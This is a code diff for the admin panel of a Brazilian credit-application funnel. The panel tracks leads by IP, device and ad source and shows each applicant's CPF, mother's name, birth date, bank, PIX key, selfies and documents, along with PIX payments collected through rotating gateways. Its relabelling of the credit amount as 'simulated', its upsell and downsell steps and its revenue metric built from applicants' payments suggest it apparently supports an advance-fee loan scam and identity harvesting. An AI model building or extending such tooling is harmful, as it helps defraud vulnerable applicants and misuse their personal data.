@@ -8,6 +8,16 @@
     reprovado: 'Reprovado',
     pendente: 'Pendente'
   };
+  const filters = [
+    ['', 'Todos'],
+    ['novo', 'Novos'],
+    ['cadastro', 'Cadastro'],
+    ['analise', 'Com foto'],
+    ['pix', 'PIX'],
+    ['aprovado', 'Pagos']
+  ];
+  const gateNames = { flevopay: 'FlevoPay', ironpay: 'IronPay', pixzy: 'Pixzy' };
+  let currentFilter = '';
 
   async function api(url, opts) {
     const res = await fetch(url, Object.assign({ credentials: 'include', headers: { 'Content-Type': 'application/json' } }, opts || {}));
@@ -71,11 +81,14 @@
 
   async function loadStats() {
     const s = await api('/api/admin/stats');
+    document.getElementById('liveStamp').textContent = 'Atualizado ' + new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
     document.getElementById('kpis').innerHTML = [
-      ['Solicitações', s.leads, 'leads recebidos'],
-      ['Taxa de aprovação', pct(s.conversionRate), s.approvedCount + ' créditos pagos'],
-      ['PIX gerados', s.pixGenerated, 'vs ' + s.pixPaid + ' pagos'],
-      ['PIX pagos', pct(s.pixPayRate), 'conversão do PIX']
+      ['Hoje', s.leadsToday || 0, 'leads novos'],
+      ['Solicitações', s.leads, pct(s.conversionRate) + ' pagos'],
+      ['IPs únicos', s.uniqueIps || 0, (s.repeatedIps || 0) + ' repetidos'],
+      ['PIX gerados', s.pixGenerated, s.pixPaid + ' pagos'],
+      ['Conversão PIX', pct(s.pixPayRate), 'pago / gerado'],
+      ['Recebido', money(s.revenueCents), 'soma dos PIX pagos']
     ].map(([l, v, e]) => `<div class="kpi"><span>${l}</span><strong>${v}</strong><em>${e}</em></div>`).join('');
 
     const total = Math.max(1, s.leads);
@@ -90,18 +103,31 @@
       return `<div class="bar-row"><span>${l}</span><div class="bar"><i style="width:${Math.min(100, w)}%"></i></div><b>${v}</b></div>`;
     }).join('');
     const gw = s.gateway === 'ironpay' || s.gateway === 'pixzy' ? s.gateway : 'flevopay';
+    const volumes = (s.gateways || []).map((g) => `
+      <div class="gw-row"><span>${esc(gateNames[g.gateway] || g.gateway)}</span><b>${g.paid}/${g.generated}</b></div>
+    `).join('') || '<div class="empty">Nenhum PIX ainda.</div>';
     document.getElementById('statusBox').innerHTML = `
-      <div class="kpi"><span>Pendentes</span><strong>${s.pendingCount || 0}</strong></div>
       <div class="gateway-pick">
         <span>Gateway PIX</span>
         <div class="seg">
-          <button type="button" class="${gw === 'flevopay' ? 'on' : ''}" onclick="setGateway('flevopay')">FlevoPay</button>
-          <button type="button" class="${gw === 'ironpay' ? 'on' : ''}" onclick="setGateway('ironpay')">IronPay</button>
+          <button type="button" class="${gw === 'flevopay' ? 'on' : ''}" onclick="setGateway('flevopay')">Flevo</button>
+          <button type="button" class="${gw === 'ironpay' ? 'on' : ''}" onclick="setGateway('ironpay')">Iron</button>
           <button type="button" class="${gw === 'pixzy' ? 'on' : ''}" onclick="setGateway('pixzy')">Pixzy</button>
         </div>
-        <em id="gatewayHint">Novos PIX saem pelo gateway marcado. Os já gerados continuam no provedor original.</em>
+        <em id="gatewayHint">Novos PIX saem pelo gateway marcado.</em>
       </div>
+      <div style="margin-top:12px">${volumes}</div>
     `;
+    const ips = s.topIps || [];
+    document.getElementById('ipBox').innerHTML = ips.length ? ips.map((row) => `
+      <div class="ip-row">
+        <button type="button" onclick="focusIp('${esc(row.ip)}')">${esc(row.ip)}</button>
+        <span>${row.leads} lead${row.leads > 1 ? 's' : ''}${row.paid ? ' · ' + row.paid + ' pago' : ''}</span>
+      </div>
+    `).join('') : '<div class="empty">Os próximos acessos aparecem aqui com o IP.</div>';
+    document.getElementById('filters').innerHTML = filters.map(([id, label]) => `
+      <button type="button" class="${currentFilter === id ? 'on' : ''}" onclick="setFilter('${id}')">${label}</button>
+    `).join('');
   }
 
   async function setGateway(name) {
@@ -114,29 +140,42 @@
     }
   }
 
+  function setFilter(id) {
+    currentFilter = id;
+    loadStats();
+    loadLeads();
+  }
+
+  function focusIp(ip) {
+    document.getElementById('search').value = ip;
+    currentFilter = '';
+    loadStats();
+    loadLeads();
+  }
+
   async function loadLeads() {
     const q = document.getElementById('search').value;
-    const rows = await api('/api/admin/leads?q=' + encodeURIComponent(q));
+    const rows = await api('/api/admin/leads?q=' + encodeURIComponent(q) + '&status=' + encodeURIComponent(currentFilter));
     if (!rows.length) {
-      document.getElementById('tableWrap').innerHTML = '<div class="empty">Nenhuma solicitação ainda.</div>';
+      document.getElementById('tableWrap').innerHTML = '<div class="empty">Nenhuma solicitação com esse filtro.</div>';
       return;
     }
     document.getElementById('tableWrap').innerHTML = `
-      <table>
-        <thead><tr><th>Quando</th><th>Cliente</th><th>CPF</th><th>Status</th><th>PIX</th><th>Fotos</th></tr></thead>
+      <div class="table-scroll"><table>
+        <thead><tr><th>Quando</th><th>Cliente</th><th>IP</th><th>Origem</th><th>Status</th><th>PIX</th></tr></thead>
         <tbody>
           ${rows.map((r) => `
             <tr onclick="openLead('${r.id}')">
-              <td>${fmt(r.createdAt)}</td>
-              <td>${esc(r.nome || '—')}</td>
-              <td>${esc(r.cpf || '—')}</td>
+              <td>${fmt(r.updatedAt || r.createdAt)}<div style="color:#6B6280;font-size:12px">${esc(stepName(r.step))}</div></td>
+              <td><strong>${esc(r.nome || 'Sem nome')}</strong><div style="color:#6B6280;font-size:12px">${esc(r.cpf || r.telefone || '—')}</div></td>
+              <td><span class="mono">${esc(r.ip || '—')}</span>${r.ipLeadCount > 1 ? `<div><span class="tag warn">${r.ipLeadCount} no mesmo IP</span></div>` : ''}</td>
+              <td>${esc(r.utmSource || r.utmCampaign || 'direto')}<div style="color:#6B6280;font-size:12px">${esc(deviceLabel(r.userAgent))}</div></td>
               <td><span class="tag ${esc(r.status || 'pendente')}">${esc(labels[r.status] || r.status || 'Pendente')}</span></td>
-              <td>${r.pixCount || 0}</td>
-              <td>${r.photoCount || 0}</td>
+              <td>${r.pixCount || 0}${r.lastPix ? `<div style="color:#6B6280;font-size:12px">${esc(gateNames[r.lastPix.gateway] || r.lastPix.gateway || '')} · ${esc(money(r.lastPix.amount))}</div>` : ''}</td>
             </tr>
           `).join('')}
         </tbody>
-      </table>`;
+      </table></div>`;
   }
 
   async function openLead(id) {
@@ -144,28 +183,53 @@
     document.getElementById('listView').classList.add('hidden');
     const d = document.getElementById('detailView');
     d.classList.remove('hidden');
-    const fields = [
+    const person = [
       ['Nome', l.nome], ['CPF', l.cpf], ['Nome da mãe', l.nomeMae], ['Nascimento', l.dataNasc],
       ['E-mail', l.email], ['Telefone', l.telefone], ['Banco', l.banco], ['Tipo PIX', l.tipoPix],
-      ['Chave PIX', l.chavePix], ['Valor aprovado', l.valor], ['Parcelas', l.parcelas], ['Parcela', l.parcelaMensal],
-      ['Status', labels[l.status] || l.status], ['UTM source', l.utmSource], ['Campanha', l.utmCampaign], ['ttclid', l.ttclid]
+      ['Chave PIX', l.chavePix], ['Valor simulado', l.valor], ['Parcelas', l.parcelas], ['Parcela', l.parcelaMensal]
     ];
+    const origin = [
+      ['UTM source', l.utmSource], ['Meio', l.utmMedium], ['Campanha', l.utmCampaign],
+      ['Conteúdo', l.utmContent], ['Termo', l.utmTerm], ['ttclid', l.ttclid], ['sck', l.sck]
+    ];
+    const ips = (l.ips || []).map((item) => `<div class="ip-row"><span class="mono">${esc(item.ip)}</span><span>${fmt(item.at)}</span></div>`).join('');
+    const steps = (l.steps || []).slice().reverse().map((step) => `
+      <div><i></i><span>${esc(stepName(step.step))}</span><b>${fmt(step.at)}</b></div>
+    `).join('');
     d.innerHTML = `
       <button class="btn ghost small" onclick="backList()">← Voltar</button>
-      <h2 style="margin:16px 0 18px">${esc(l.nome || 'Cliente')} <span class="tag ${esc(l.status || '')}">${esc(labels[l.status] || l.status || '')}</span></h2>
-      <div class="grid">
-        ${fields.map(([k, v]) => `<div class="field"><small>${k}</small>${esc(v || '—')}</div>`).join('')}
+      <h2 style="margin:16px 0 8px">${esc(l.nome || 'Cliente')} <span class="tag ${esc(l.status || '')}">${esc(labels[l.status] || l.status || '')}</span></h2>
+      <div class="actions">
+        ${l.ip ? `<button class="btn ghost small" onclick="copyText(${JSON.stringify(l.ip)})">Copiar IP</button>` : ''}
+        ${l.cpf ? `<button class="btn ghost small" onclick="copyText(${JSON.stringify(l.cpf)})">Copiar CPF</button>` : ''}
+        ${l.telefone ? `<button class="btn ghost small" onclick="copyText(${JSON.stringify(l.telefone)})">Copiar telefone</button>` : ''}
       </div>
-      <h3 style="margin:22px 0 8px">Selfie e documentos</h3>
+      <h3 class="section">Sessão</h3>
+      <div class="grid">
+        <div class="field"><small>IP atual</small><span class="mono">${esc(l.ip || '—')}</span></div>
+        <div class="field"><small>Aparelho</small>${esc(deviceLabel(l.userAgent))}</div>
+        <div class="field"><small>Navegador</small>${esc(l.userAgent || '—')}</div>
+        <div class="field"><small>Referer</small>${esc(l.referer || '—')}</div>
+        <div class="field"><small>Visitante</small><span class="mono">${esc(l.visitorId || '—')}</span></div>
+        <div class="field"><small>Atualizado</small>${fmt(l.updatedAt)}</div>
+      </div>
+      ${ips ? `<div class="section"><strong>Histórico de IP</strong>${ips}</div>` : ''}
+      <h3 class="section">Cadastro</h3>
+      <div class="grid">${person.map(([k, v]) => `<div class="field"><small>${k}</small>${esc(v || '—')}</div>`).join('')}</div>
+      <h3 class="section">Origem</h3>
+      <div class="grid">${origin.map(([k, v]) => `<div class="field"><small>${k}</small>${esc(v || '—')}</div>`).join('')}</div>
+      <h3 class="section">Caminho no funil</h3>
+      <div class="timeline">${steps || '<div class="empty">Sem etapas registradas</div>'}</div>
+      <h3 class="section">Selfie e documentos</h3>
       <div class="photos">
         ${(l.photos || []).length ? l.photos.map((p) => `<a href="${p.url}" target="_blank"><img src="${p.url}" alt="selfie"></a>`).join('') : '<div class="empty">Nenhuma foto enviada</div>'}
       </div>
-      <h3 style="margin:22px 0 8px">PIX gerados</h3>
+      <h3 class="section">PIX gerados</h3>
       ${(l.pix || []).length ? l.pix.map((p) => `
         <div class="pix">
-          <div><strong>${esc(p.gateway || 'flevopay')} · ${esc(p.product || p.page || 'PIX')}</strong> · ${esc(statusLabel(p.status))} · ${fmt(p.createdAt)}</div>
-          <div style="font-size:12px;color:#6B7280;margin-top:4px">ID: ${esc(p.transactionId || p.reference || '—')} · valor: ${esc(money(p.amount))}</div>
-          ${p.qrCode ? `<code>${esc(p.qrCode)}</code><button class="btn small" onclick="navigator.clipboard.writeText(${JSON.stringify(p.qrCode)})">Copiar código</button>` : ''}
+          <div><strong>${esc(gateNames[p.gateway] || p.gateway || 'PIX')} · ${esc(p.product || p.page || 'PIX')}</strong> · ${esc(statusLabel(p.status))} · ${fmt(p.createdAt)}</div>
+          <div style="font-size:12px;color:#6B7280;margin-top:4px">IP ${esc(p.ip || l.ip || '—')} · ID ${esc(p.transactionId || p.reference || '—')} · ${esc(money(p.amount))}</div>
+          ${p.qrCode ? `<code>${esc(p.qrCode)}</code><button class="btn small" onclick="copyText(${JSON.stringify(p.qrCode)})">Copiar código</button>` : ''}
         </div>
       `).join('') : '<div class="empty">Nenhum PIX gerado ainda</div>'}
     `;
@@ -176,6 +240,44 @@
     document.getElementById('listView').classList.remove('hidden');
     loadLeads();
     loadStats();
+  }
+  function stepName(step) {
+    const s = String(step || '');
+    if (s.indexOf('pix:') === 0) return 'PIX ' + s.slice(4);
+    const path = s.replace(/\/index\.html$/, '').replace(/\/$/, '') || '/';
+    const names = {
+      '/': 'Home',
+      '/inicio': 'Simulação',
+      '/2': 'CPF',
+      '/3': 'Dados',
+      '/4': 'Contato',
+      '/5': 'Endereço',
+      '/6': 'Selfie',
+      '/7': 'Renda',
+      '/8': 'Revisão',
+      '/criando': 'Análise',
+      '/conta': 'Chave PIX',
+      '/final': 'Oferta',
+      foto: 'Foto'
+    };
+    if (names[path]) return names[path];
+    if (path.indexOf('/ups/') === 0) return 'Upsell ' + path.split('/').pop();
+    if (path.indexOf('/backs/') === 0) return 'Downsell';
+    return s || '—';
+  }
+  function deviceLabel(ua) {
+    const s = String(ua || '');
+    if (!s) return '—';
+    const mobile = /Mobile|Android|iPhone|iPad/i.test(s);
+    let browser = 'Navegador';
+    if (/Edg\//.test(s)) browser = 'Edge';
+    else if (/Chrome\//.test(s)) browser = 'Chrome';
+    else if (/Firefox\//.test(s)) browser = 'Firefox';
+    else if (/Safari\//.test(s)) browser = 'Safari';
+    return (mobile ? 'Celular' : 'Desktop') + ' · ' + browser;
+  }
+  function copyText(value) {
+    navigator.clipboard.writeText(String(value || ''));
   }
   function statusLabel(s) {
     if (s === 'approved' || s === 'paid') return 'Pago';
@@ -198,6 +300,9 @@
   window.doLogin = doLogin;
   window.logout = logout;
   window.setGateway = setGateway;
+  window.setFilter = setFilter;
+  window.focusIp = focusIp;
+  window.copyText = copyText;
   window.loadLeads = loadLeads;
   window.openLead = openLead;
   window.backList = backList;
